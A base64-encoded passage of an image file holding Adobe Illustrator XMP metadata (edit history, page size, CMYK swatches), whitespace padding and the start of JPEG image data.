XNzPgogICAgICAgICA8L3htcE1NOkRlcml2ZWRGcm9tPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOjRGMUQxMUI3Q0EyQkUzMTFCMjhBRjQ4NDMwMTYxNjU5PC94bXBNTTpJbnN0YW5jZUlEPgogICAgICAgICA8eG1wTU06RG9jdW1lbnRJRD54bXAuZGlkOjRGMUQxMUI3Q0EyQkUzMTFCMjhBRjQ4NDMwMTYxNjU5PC94bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SGlzdG9yeT4KICAgICAgICAgICAgPHJkZjpTZXE+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPmNvbnZlcnRlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6cGFyYW1ldGVycz5mcm9tIGFwcGxpY2F0aW9uL3Bvc3RzY3JpcHQgdG8gYXBwbGljYXRpb24vdm5kLmFkb2JlLmlsbHVzdHJhdG9yPC9zdEV2dDpwYXJhbWV0ZXJzPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDpCMzI2QzE1RjcxMUVFMzExQTNBNUI2MDA1RjMzNDREMzwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxMy0wOS0xNlQxMTo0MzoyMysxMDowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgSWxsdXN0cmF0b3IgQ1M0PC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICAgICA8c3RFdnQ6Y2hhbmdlZD4vPC9zdEV2dDpjaGFuZ2VkPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+Y29udmVydGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpwYXJhbWV0ZXJzPmZyb20gYXBwbGljYXRpb24vcG9zdHNjcmlwdCB0byBhcHBsaWNhdGlvbi92bmQuYWRvYmUuaWxsdXN0cmF0b3I8L3N0RXZ0OnBhcmFtZXRlcnM+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5zYXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOjM2NDMwOEE4QkMyMEUzMTE5NjgzOUExODdDMjM1OUVGPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDEzLTA5LTE5VDA5OjQ3OjE5KzEwOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBJbGx1c3RyYXRvciBDUzQ8L3N0RXZ0OnNvZnR3YXJlQWdlbnQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpjaGFuZ2VkPi88L3N0RXZ0OmNoYW5nZWQ+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jb252ZXJ0ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnBhcmFtZXRlcnM+ZnJvbSBhcHBsaWNhdGlvbi9wb3N0c2NyaXB0IHRvIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5pbGx1c3RyYXRvcjwvc3RFdnQ6cGFyYW1ldGVycz4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6NEMxRDExQjdDQTJCRTMxMUIyOEFGNDg0MzAxNjE2NTk8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTMtMTAtMDNUMTE6MjU6NDArMTA6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIElsbHVzdHJhdG9yIENTNDwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6NEQxRDExQjdDQTJCRTMxMUIyOEFGNDg0MzAxNjE2NTk8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTMtMTAtMDNUMTE6MjU6NDgrMTA6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIElsbHVzdHJhdG9yIENTNDwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6NEYxRDExQjdDQTJCRTMxMUIyOEFGNDg0MzAxNjE2NTk8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTMtMTAtMDNUMTE6MjY6MjUrMTA6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIElsbHVzdHJhdG9yIENTNDwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8eG1wTU06T3JpZ2luYWxEb2N1bWVudElEPnV1aWQ6RDUyRTQ3MUFFOEUwREIxMTg5RDRFQzUzRUJDRkZFRDc8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOlJlbmRpdGlvbkNsYXNzPnByb29mOnBkZjwveG1wTU06UmVuZGl0aW9uQ2xhc3M+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXBUUGc9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC90L3BnLyIKICAgICAgICAgICAgeG1sbnM6c3REaW09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9EaW1lbnNpb25zIyIKICAgICAgICAgICAgeG1sbnM6eG1wRz0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL2cvIj4KICAgICAgICAgPHhtcFRQZzpNYXhQYWdlU2l6ZSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgIDxzdERpbTp3PjI5Ni45OTk5NTk8L3N0RGltOnc+CiAgICAgICAgICAgIDxzdERpbTpoPjIwOS45OTk5Mjk8L3N0RGltOmg+CiAgICAgICAgICAgIDxzdERpbTp1bml0Pk1pbGxpbWV0ZXJzPC9zdERpbTp1bml0PgogICAgICAgICA8L3htcFRQZzpNYXhQYWdlU2l6ZT4KICAgICAgICAgPHhtcFRQZzpOUGFnZXM+MTwveG1wVFBnOk5QYWdlcz4KICAgICAgICAgPHhtcFRQZzpIYXNWaXNpYmxlVHJhbnNwYXJlbmN5PkZhbHNlPC94bXBUUGc6SGFzVmlzaWJsZVRyYW5zcGFyZW5jeT4KICAgICAgICAgPHhtcFRQZzpIYXNWaXNpYmxlT3ZlcnByaW50PkZhbHNlPC94bXBUUGc6SGFzVmlzaWJsZU92ZXJwcmludD4KICAgICAgICAgPHhtcFRQZzpQbGF0ZU5hbWVzPgogICAgICAgICAgICA8cmRmOlNlcT4KICAgICAgICAgICAgICAgPHJkZjpsaT5NYWdlbnRhPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGk+WWVsbG93PC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGk+QmxhY2s8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcFRQZzpQbGF0ZU5hbWVzPgogICAgICAgICA8eG1wVFBnOlN3YXRjaEdyb3Vwcz4KICAgICAgICAgICAgPHJkZjpTZXE+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8eG1wRzpncm91cE5hbWU+RGVmYXVsdCBTd2F0Y2ggR3JvdXA8L3htcEc6Z3JvdXBOYW1lPgogICAgICAgICAgICAgICAgICA8eG1wRzpncm91cFR5cGU+MDwveG1wRzpncm91cFR5cGU+CiAgICAgICAgICAgICAgICAgIDx4bXBHOkNvbG9yYW50cz4KICAgICAgICAgICAgICAgICAgICAgPHJkZjpTZXE+CiAgICAgICAgICAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpzd2F0Y2hOYW1lPldoaXRlPC94bXBHOnN3YXRjaE5hbWU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOm1vZGU+Q01ZSzwveG1wRzptb2RlPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzp0eXBlPlBST0NFU1M8L3htcEc6dHlwZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6Y3lhbj4wLjAwMDAwMDwveG1wRzpjeWFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzptYWdlbnRhPjAuMDAwMDAwPC94bXBHOm1hZ2VudGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnllbGxvdz4wLjAwMDAwMDwveG1wRzp5ZWxsb3c+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOmJsYWNrPjAuMDAwMDAwPC94bXBHOmJsYWNrPgogICAgICAgICAgICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnN3YXRjaE5hbWU+QmxhY2s8L3htcEc6c3dhdGNoTmFtZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6bW9kZT5DTVlLPC94bXBHOm1vZGU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnR5cGU+UFJPQ0VTUzwveG1wRzp0eXBlPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpjeWFuPjAuMDAwMDAwPC94bXBHOmN5YW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOm1hZ2VudGE+MC4wMDAwMDA8L3htcEc6bWFnZW50YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6eWVsbG93PjAuMDAwMDAwPC94bXBHOnllbGxvdz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6YmxhY2s+MTAwLjAwMDAwMDwveG1wRzpibGFjaz4KICAgICAgICAgICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpzd2F0Y2hOYW1lPlNtb2tlPC94bXBHOnN3YXRjaE5hbWU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOm1vZGU+Q01ZSzwveG1wRzptb2RlPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzp0eXBlPlBST0NFU1M8L3htcEc6dHlwZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6Y3lhbj4wLjAwMDAwMDwveG1wRzpjeWFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzptYWdlbnRhPjAuMDAwMDAwPC94bXBHOm1hZ2VudGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnllbGxvdz4wLjAwMDAwMDwveG1wRzp5ZWxsb3c+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOmJsYWNrPjMwLjAwMDAwMTwveG1wRzpibGFjaz4KICAgICAgICAgICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzpzd2F0Y2hOYW1lPlJlZDwveG1wRzpzd2F0Y2hOYW1lPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wRzptb2RlPkNNWUs8L3htcEc6bW9kZT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6dHlwZT5QUk9DRVNTPC94bXBHOnR5cGU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOmN5YW4+MC4wMDAwMDA8L3htcEc6Y3lhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6bWFnZW50YT4xMDAuMDAwMDAwPC94bXBHOm1hZ2VudGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDx4bXBHOnllbGxvdz4xMDAuMDAwMDAwPC94bXBHOnllbGxvdz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPHhtcEc6YmxhY2s+MC4wMDAwMDA8L3htcEc6YmxhY2s+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICAgICAgICA8L3JkZjpTZXE+CiAgICAgICAgICAgICAgICAgIDwveG1wRzpDb2xvcmFudHM+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICA8L3JkZjpTZXE+CiAgICAgICAgIDwveG1wVFBnOlN3YXRjaEdyb3Vwcz4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pv/uAA5BZG9iZQBkwAAAAAH/2wCEAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECAgICAgICAgICAgMDAwMDAwMDAwMBAQEBAQEBAgEBAgICAQICAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA//AABEIANkCTgMBEQACEQEDEQH/xAGiAAAABgIDAQAAAAAAAAAAAAAHCAYFBAkDCgIBAAsBAAAGAwEBAQAAAAAAAAAAAAYFBAMHAggBCQAKCxAAAgEDBAEDAwIDAwMCBgl1AQIDBBEFEgYhBxMiAAgxFEEyIxUJUUIWYSQzF1JxgRhikSVDobHwJjRyChnB0TUn4VM2gvGSokRUc0VGN0djKFVWVxqywtLi8mSDdJOEZaOzw9PjKThm83UqOTpISUpYWVpnaGlqdnd4eXqFhoeIiYqUlZaXmJmapKWmp6ipqrS1tre4ubrExcbHyMnK1NXW19jZ2uTl5ufo6er09fb3+Pn6EQACAQMCBAQDBQQEBAYGBW0BAgMRBCESBTEGACITQVEHMmEUcQhCgSORFVKhYhYzCbEkwdFDcvAX4YI0JZJTGGNE8aKyJjUZVDZFZCcKc4OTRnTC0uLyVWV1VjeEhaOzw9Pj8ykalKS0xNTk9JWltcXV5fUoR1dmOHaGlqa2xtbm9md3h5ent8fX5/dIWGh4iJiouMjY6Pg5SVlpeYmZqbnJ2en5KjpKWmp6ipqqusra6vr/2gAMAwEAAhEDEQA/AN/j37r3Xvfuvde9+691737r3Xvfuvde9+691WV/Nw2L2Vuf4W7+3p09vPfOxuxOkqzH9vYzKbA3RndpZeswG2Uqqfe9DVZLb9ZRVsmOo9n5Ksyfi1Waqx0J4tcAT3GtL6flea622WWG9tSJgY3ZCVWocEqQaBCzU9VHWYn3FuZeUNn+8LtfL3Pu37buXKnMUb7XJHe20N1Es1wVazdY50dBI11HFb6qVEc8gzWnWoPtD+Z78/8AY/h/gvyr7XrfBo0f3vy9J2Fq8fi0+b+/1BuX7i/hGryatV2vfU18brbn3nG0p4W4XBp/GRJ/1cDV/PrvFv33Nvuu8yav3hyTsceqtfpYmseNeH0T2+niaaaUxT4RQz+0f57f8wjbXi/jO8euOwPHbX/e7rDb9F57fXy/3C/uRbV+dGj/AAt7Prb3b5yg/tZYJv8ATxKP+rejqG9+/u0fusbvq/d9hu+1V4fS7jO9Ps+t+s/nXqxL4e/z6uze3O+OqOpO8+reqdvbe7H3bjtmVe9dlVO6sIcJlNwCTG7eqXxm5M9uanahn3HPSQ1DSVSCGnkeTUSliNOWvd6/3Ld7fbt2t7dIZ5AhdC66S2FNGZhTVQHOASesUPfv+7I5O5E9s98569tt63u73XaLF7tbS7W2m8aOCkk6+Jbw27axbrK6BYzqdVWndUbPnueuuNnXvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3RetwdgY6fv9fjrvamx1bgO2+gtzb12XiqmkaePPwddbuxuzu9MbmJXT7ZqZcV3JsoUtMWLzxzVrBdMTn3SSOOaNoZQGidSCDwIIoQfkR0rsL682y+h3Lb5Hhv7eVJYpENGSSNg6OpGQysAwPkQD18+T5TdH5T42/InuHo7KioZ+ut8ZjC4yqqk8U+U2xLIuT2fnHju3j/j21K+irQLmyzgXP194QcwbTJse9XO0yVrBKVBPmvFG/2yFW/Pr65PZX3Hs/d32o2D3IstIXdttilkVTVY7gDw7qEHz8G5SWKvqnAdAF7J+pQ6k0dZV46spchQVM1HXUNTBWUVXTSNDUUtXTSrPT1NPMhV4poJkDIwIKsAR7srMjB0JDg1BHEEcD0zcW8F3A9rcosltKhR1YAqysCGVgcEEEgg4IPX0evhr33S/J34v9Ld4RSxSZDe+ycfLueOFY44qTe+Gabb2+aKKKJY0jp6Td2JrUh9CaoQjBVBA95t8s7uu/bDa7qPjliGr5SL2yD8nDU+XXyT/eA9sZvZv3l5h9uJFYWu27i4tyaktZygT2bkmpLNayxFsmjlhUkV6M17Peoe697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuqe/wCbr2TL8XqD4R/OcVEeO2z8ZPmf1ptvvHLVLMtBRfGn5TY/NfGztGoyKRFJZ6fAbo39tfcEKFxGa7B07MrFVt7r3VVv/CiL48rt/s3qD5M4Wh8dB2Hg6jrPe08Mb+Jd2bPD5Pa9fWStdDW53a1dPSoqkDw4McXuTjp70bN4N/bb7EOyZDE/+nTKE/NkJH2R9dzf7qT3VO6cnb97PbhJW62q5XcLMEiv011SO5RRx0Q3KJISfxXnGlANbj3CHXXLr3v3XutrH/hOr8hVr9td1/F7M14NXgK6k7j2JSSMGmkw+X+x2vv2nhLMDHSYvLQYaZEUEGXJTNwb6shPZXedcF1sEp7kImjH9E0SQfYDoP2seuJP96/7VG13jl33m2+L9C6jbarxgMCWLXc2TH1aSI3aEmnbbxrny2bPc7dcduve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917qvL+bR8fn+Un8tD5wdGUtA2Uze8fjj2TWbQxyRmV6zsDZeDm3713TqisrapN9bYxwBFyp5ANrH3Xuqkfi52Gn83v/AITtdcbmkds53T1p1VBt3OeQxz5lu8/izG2BrquclqmNcz2rs/ELWjSV/Z3MOIiSiA/nzZf37ytdWiCtwieLH664+6g+bLqT/bdZQ/c291T7P/eI5e5kuZPD2O7uf3fe1NF+mvSIS70I7YJTFcnjmEYPDrVd94a9fU91737r3R2f5dfyGPxh+Y3SXaVZkP4ftUbpg2hv+SSZoaMbE3up21uKsr1UgT0+34MguVRG9P3FBGfwPYp5K3r9w8zWu4MdNv4miT08N+1if9LXX9qjrHX71/tUPeT2B5j5Lt4vF3v6I3VkAKv9bZ/4xAiejTlDbEjOiZx59fRE95o9fKV1737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3XvfuvdcXRJEaORVdHVkdHUMjowKsrKwIZWBsQeCPfuvdaOn/CZzs9vhx/Mu/mtfygdy1/8M27ge5+x+1ehsPWNFR0ss3WW9J9gblbERyLBNWZDffUtftPKwxKl1x235ZQoVXt7r3RS/5i3x3/ANlf+Y3dfV1DQ/Y7UO55d49fxxw+GkGxd7qNyYChofURLT7ejr3xTPxqnoJOB9PeF/Ouy/uDma629BS38TXH6eG/coH+lro+1T19Wf3Tvdb/AF5fYHl3nO5l8Xe/oxa3xJq31ln/AIvO7+jTlBcgeSTLk9Ej9hXrIzr3v3XuvoO/yv8A5DN8lfhN0vvfIV3327duYP8A0Zb8keRJKpt19frFgpa+vMdkWt3HhYqLLOAFAFeLADj3mTyFvP785WtbtzW5RPCk9dcfbU/Nl0v/ALbr5Yvvl+1Q9oPvE8w8uWsfh7Fd3P7wsgAQv019WYIlc6IJjNbA5/sDk8erAPYx6xd697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3X